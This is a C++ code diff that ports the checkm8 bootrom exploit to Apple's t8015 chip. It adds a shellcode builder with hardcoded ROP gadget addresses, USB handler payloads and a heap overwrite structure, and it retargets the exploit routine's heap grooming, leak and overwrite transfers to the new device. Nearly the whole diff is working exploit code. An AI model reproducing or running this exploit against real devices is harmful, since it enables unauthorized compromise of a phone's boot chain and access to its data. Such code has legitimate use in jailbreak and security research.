@@ -447,6 +447,134 @@ vector<uint8_t> getS8000Shellcode()
   return s8000_shellcode;
 }
 
+/*
+        Generate shellcode for the t8015
+*/
+vector<uint8_t> getT8015Shellcode()
+{
+  vector<uint8_t> Shellcode;
+
+  vector<uint64_t> constants_usb_t8015 = {
+      0x18001C000,        // 1 - LOAD_ADDRESS
+      0x6578656365786563, // 2 - EXEC_MAGIC
+      0x646F6E65646F6E65, // 3 - DONE_MAGIC
+      0x6D656D636D656D63, // 4 - MEMC_MAGIC
+      0x6D656D736D656D73, // 5 - MEMS_MAGIC
+      0x10000B9A8         // 6 - USB_CORE_DO_IO
+  };
+
+  vector<uint64_t> constants_checkm8_t8015 = {
+      0x180008528,          // 1 - gUSBDescriptors
+      0x180003A78,          // 2 - gUSBSerialNumber
+      0x10000AE80,          // 3 - usb_create_string_descriptor
+      0x1800008FA,          // 4 - gUSBSRNMStringDescriptor
+      0x18001BC00,          // 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
+      PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
+      0x180008638,          // 8 - PAYLOAD_PTR
+  };
+
+  uint64_t t8015_load_write_gadget          = 0x10000945C;
+  uint64_t t8015_write_sctlr_gadget         = 0x1000003EC;
+  uint64_t t8015_func_gadget                = 0x10000A9AC;
+  uint64_t t8015_write_ttbr0                = 0x10000045C;
+  uint64_t t8015_tlbi                       = 0x1000004AC;
+  uint64_t t8015_dc_civac                   = 0x1000004D0;
+  uint64_t t8015_dmb                        = 0x1000004F0;
+  uint64_t t8015_handle_interface_request   = 0x10000BCCC;
+
+  vector<Callback> t8015_callbacks = {
+        Callback(t8015_dc_civac, 0x18001C800),
+        Callback(t8015_dc_civac, 0x18001C840),
+        Callback(t8015_dc_civac, 0x18001C880),
+        Callback(t8015_dmb, 0),
+        Callback(t8015_write_sctlr_gadget, 0x100D),
+        Callback(t8015_load_write_gadget, 0x18001C000),
+        Callback(t8015_load_write_gadget, 0x18001C010),
+        Callback(t8015_write_ttbr0, 0x180020000),
+        Callback(t8015_tlbi, 0),
+        Callback(t8015_load_write_gadget, 0x18001C020),
+        Callback(t8015_write_ttbr0, 0x18000C000),
+        Callback(t8015_tlbi, 0),
+        Callback(0x18001C800, 0),
+  };
+
+  /*
+    t8015_callback_data = usb_rop_callbacks(0x18001C020, t8015_func_gadget, t8015_callbacks)
+    t8015_handler = asm_arm64_x7_trampoline(t8015_handle_interface_request) 
+            + asm_arm64_branch(0x10, 0x0) 
+            + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8015)[4:]
+                                  */
+  vector<uint8_t> t8015_handler;
+  appendV<uint8_t, uint8_t>(
+      t8015_handler, asm_arm64_x7_trampoline(t8015_handle_interface_request));
+  append<uint8_t, uint32_t>(t8015_handler, asm_arm64_branch(0x10, 0x0));
+  auto PreSC =
+      prepare_shellcode(std::string("usb_0xA1_2_arm64"), constants_usb_t8015);
+  append<uint8_t>(t8015_handler, PreSC.data() + 4, PreSC.size() - 4);
+
+  auto t8015_shellcode =
+      prepare_shellcode("checkm8_arm64", constants_checkm8_t8015);
+
+  // Do some checks
+  assert(t8015_shellcode.size() <= PAYLOAD_OFFSET_ARM64);
+  assert(t8015_handler.size() <= PAYLOAD_SIZE_ARM64);
+
+  // t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
+  vector<uint8_t> Zeros;
+  Zeros.insert(Zeros.end(), (PAYLOAD_OFFSET_ARM64 - t8015_shellcode.size()), 0);
+  appendV(t8015_shellcode, Zeros);
+  appendV(t8015_shellcode, t8015_handler);
+
+  /*
+    return struct.pack('<6Q16x448s1536x1024s', 
+            0x180020400-8, 0x1000006A5, 
+            0x180020600-8, 0x180000625, 
+            0x18000C600-8, 0x180000625, 
+            t8015_callback_data, t8015_shellcode)
+  */ 
+
+  // Create finale shellcode
+  // 0x00 - 0x08 
+  append(Shellcode, 0x180020400-8);
+
+  // 0x08 - 0x10 
+  append(Shellcode, 0x1000006A5);
+
+  // 0x10 - 0x18 
+  append(Shellcode, 0x180020600-8);
+
+  // 0x`8 - 0x20 
+  append(Shellcode, 0x180000625);
+
+  // 0x20 - 0x28 
+  append(Shellcode, 0x18000C600-8);
+
+  // 0x28 - 0x30 
+  append(Shellcode, 0x180000625);
+
+  // 0x30 - 0x40 [16x]
+  Shellcode.insert(Shellcode.end(), 16, 0);
+
+  // 0x40 - 0x200 [448s t8015_callback_data]
+  auto urc = usb_rop_callbacks(0x18001C020, t8015_func_gadget, t8015_callbacks);
+  appendV(Shellcode, urc);
+
+  // 0x200 - 0x800 [1536x]
+  Shellcode.insert(Shellcode.end(), 1536, 0);
+
+  // 0x800 - 0xC00 [1024s t8015_shellcode]
+  appendV(Shellcode, t8015_shellcode);
+
+  assert(Shellcode.size() <= 0xC00);
+
+  Shellcode.insert(Shellcode.end(), 0xC00 - Shellcode.size(), 0);
+
+  printf("[*] Shellcode generated ...\n");
+
+  return Shellcode;
+}
+
 #pragma pack(1)
 typedef struct alignas(1)
 {
@@ -460,17 +588,34 @@ typedef struct alignas(1)
   uint32_t End = 0xbeefbeef;
 } t8010_overwrite;
 
+#pragma pack(1)
+typedef struct alignas(1)
+{
+  uint8_t temp0[0x500] = {0};
+  uint8_t temp1[32] = {0};
+  uint64_t t8015_nop_gadget0 = 0x10000A9C4;
+  uint64_t Offset = 0x18001C020;
+  uint8_t temp[16 + 32] = {0};
+  uint64_t t8015_nop_gadget1 = 0x10000A9C4;
+  uint64_t Offset2 = 0x18001C020;
+  uint8_t temp2[12] = {0};
+  uint32_t End = 0xbeefbeef;
+} t8015_overwrite;
+
 void checkm8()
 {
   // Create device config
-  t8010_overwrite Overwrite;
-  assert(sizeof(t8010_overwrite) == 1524);
+  // t8010_overwrite Overwrite;
+  t8015_overwrite Overwrite;
+  // assert(sizeof(t8010_overwrite) == 1524);
 
-  DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
-                        sizeof(Overwrite), 5, 1);
+  // DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
+  //                       sizeof(Overwrite), 5, 1);
+  DeviceConfig DC_t8015("iBoot-3332.0.0.1.23", 0x8015, 0, (uint8_t *)&Overwrite,
+                        sizeof(Overwrite), 6, 1);
 
   // Get shellcode
-  auto Shellcode = getT8010Shellcode();
+  auto Shellcode = getT8015Shellcode();
 
   // Run exploit (t8010 specific)
   DFU D;
@@ -489,7 +634,7 @@ void checkm8()
   printf("[*] stage 1, heap grooming ...\n");
 
   D.stall();
-  for (int i = 0; i < DC_t8010.hole; i++)
+  for (int i = 0; i < DC_t8015.hole; i++)
   {
     D.no_leak();
   }
@@ -514,12 +659,12 @@ void checkm8()
   D.acquire_device();
   D.usb_req_stall();
 
-  for (int i = 0; i < DC_t8010.leak; i++)
+  for (int i = 0; i < DC_t8015.leak; i++)
   {
     D.usb_req_leak();
   }
-  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, DC_t8010.overwrite,
-                                   DC_t8010.overwrite_size, 100);
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, DC_t8015.overwrite,
+                                   DC_t8015.overwrite_size, 100);
 
   for (int i = 0; i < Shellcode.size(); i += 0x800)
   {
